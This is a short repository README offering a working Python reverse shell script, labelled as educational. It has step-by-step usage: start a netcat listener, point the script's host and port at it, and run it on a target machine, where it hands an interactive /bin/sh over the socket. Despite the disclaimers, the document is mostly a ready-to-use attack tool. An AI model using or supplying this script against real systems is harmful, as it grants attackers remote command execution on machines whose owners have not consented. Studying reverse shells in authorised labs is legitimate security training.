# Python Reverse Shell Demo

This repository contains a simple **Python reverse shell** script for educational and ethical cybersecurity training purposes. 

## ⚠️ Disclaimer
This code is for **educational use only**. Use it strictly in safe, legal training environments (like labs, demos, or pen-testing with permission). Unauthorized or malicious use is strictly prohibited.

## How It Works
- The script connects to a remote server (listener) and provides shell access.
- Useful for demonstrating reverse shell concepts, red-team training, and cybersecurity classes.

## Usage
1. **Start a listener** on your machine (e.g., `nc -lvp 4444`).
2. **Edit `host`/`port` in the script** to your listener IP/port.
3. **Run the script** on the target (training) machine.

```python
# Educational Python Reverse Shell
# For cybersecurity training only
import socket,subprocess,os
host = '127.0.0.1'  # Change to your listener IP
port = 4444         # Change to your listener port
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(['/bin/sh','-i'])
```

---
**Ethical hacking and cybersecurity education only!**
